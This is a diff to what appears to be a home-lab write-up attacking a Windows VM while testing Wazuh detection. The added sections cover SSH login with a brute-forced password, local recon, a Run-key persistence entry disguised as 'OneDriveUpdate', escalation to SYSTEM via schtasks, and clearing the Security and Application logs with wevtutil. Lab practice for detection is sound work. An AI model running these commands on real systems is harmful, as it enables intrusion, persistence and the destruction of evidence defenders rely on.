@@ -105,6 +105,8 @@ sudo nmap -sS -sV -O 192.168.100.75
 ```
 And we see our ssh service.
 ![ssh](/images/image8.png)  
+
+## Phase 4.2 : Credential Access
 Now we are going to perform a brute force attack using hydra 
 
 NOTE!  
@@ -119,3 +121,78 @@ hydra -l victim -P /usr/share/wordlists/attacker_list 192.168.100.75 ssh -V
 We can see our attack got successfull.We got the victim ssh password.
 ![password](/images/image9.png)  
 
+## Phase 4.3 : Intial Access 
+Now on attacker machine we will get terminal access through ssh as we got the ssh password.
+```bash
+ssh victim@192.168.100.75
+```
+and enter the password.We succesfully got the victim's terminal
+![terminal](/images/image10.png)  
+Now we will do local recon
+```bash
+# Find out exactly who you are running as and your system privileges
+whoami /all
+
+# List all local user accounts on the machine
+net user
+
+# Look for high-privilege administrative groups
+net localgroup administrators
+
+# View active network connections and listening ports on the host
+netstat -ano
+```
+OK there's few things i missed ssh logs werent coming to wazuh so i have to open the wazuh config file and eneterd
+```bash
+<localfile>
+    <location>OpenSSH/Operational</location>
+    <log_format>eventchannel</log_format>
+  </localfile>
+  ``` 
+  File path is:
+  ```bash
+  C:\Program Files (x86)\ossec-agent\
+  ```
+  Now restart the wazuh service 
+  ```bash
+  # Stop the Wazuh Agent service
+Stop-Service -Name "Wazuh"
+# Start the Wazuh Agent service
+Start-Service -Name "Wazuh"
+```
+## Phase 4.4 : Presistence
+
+```bash
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+```
+Attacker use this command for presistence  
+HKCU\...Version\Run: This target path ensures that whenever the victim user logs in, the operating system reads this key.
+
+/v "OneDriveUpdate": The value name is masked as an update binary to blend into normal system noise.
+
+/d "C:\Windows\System32\cmd.exe": This tells Windows to launch a command prompt automatically (in a real scenario, this would point to your malicious reverse shell executable).
+
+## Phase 4.5 : Privilage Esclation
+Our user victim is already have admin privilages.Our goal is to reach SYSTEM privilages.
+Run this command to register the task successfully
+```bash
+schtasks /create /tn "ElevateTask" /tr "cmd.exe /c whoami > C:\Users\Public\privs.txt" /sc ONCE /sd "01/01/2026" /st "00:00" /ru "NT AUTHORITY\SYSTEM" /f
+```
+Now, execute the task manually to force the SYSTEM account to run your payload string instantly:
+```bash
+schtasks /run /tn "ElevateTask"
+```
+You should see a message saying: SUCCESS: Attempted to run the scheduled task "ElevateTask".Read the contents of the generated text file to confirm that the execution occurred under the highest privilege level
+```bash
+type C:\Users\Public\privs.txt
+```
+![privilage](/images/image11.png)  
+
+## Phase 4.6 : Defense Evasion
+Next phase is defense evasion and we will do it by clearing the logs.
+We will use the following commands to do so 
+```bash
+wevtutil.exe cl Application
+wevtutil.exe cl Security
+```
+Remeber we have to do it on the privilaged shell that we gained.
